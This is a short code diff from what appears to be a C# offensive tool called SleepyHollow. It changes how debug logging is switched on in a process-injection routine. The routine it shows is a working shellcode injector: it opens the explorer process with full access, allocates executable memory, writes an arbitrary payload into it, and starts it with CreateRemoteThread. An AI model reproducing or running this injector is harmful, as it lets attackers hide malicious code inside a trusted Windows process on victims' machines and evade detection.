@@ -10,15 +10,15 @@ namespace SleepyHollow;
 /// </summary>
 internal static class InjectProcess
 {
-    internal static Task Run(byte[] buf, string processName = "explorer", bool debug = false)
+    internal static Task Run(byte[] buf, string processName = "explorer")
     {
         var pid = Process.GetProcessesByName(processName)[0].Id;
         var hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
         IntPtr lpAddress = Lib.VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, Lib.MEM_COMMIT_AND_RESERVE, Lib.PAGE_EXECUTE_READWRITE, 0);
         Lib.WriteProcessMemory(hProcess, lpAddress, buf, buf.Length, out IntPtr lpNumberOfBytesWritten);
-        if(debug) Console.WriteLine("Bytes written to process memory: " + lpNumberOfBytesWritten);
+        if(RuntimeConfig.IsDebugEnabled) Console.WriteLine("Bytes written to process memory: " + lpNumberOfBytesWritten);
         IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpAddress, IntPtr.Zero, 0, IntPtr.Zero);
-        if(debug) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
+        if(RuntimeConfig.IsDebugEnabled) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
         Lib.WaitForSingleObject(hThread, 0xFFFFFFFF);
         return Task.CompletedTask;
     }
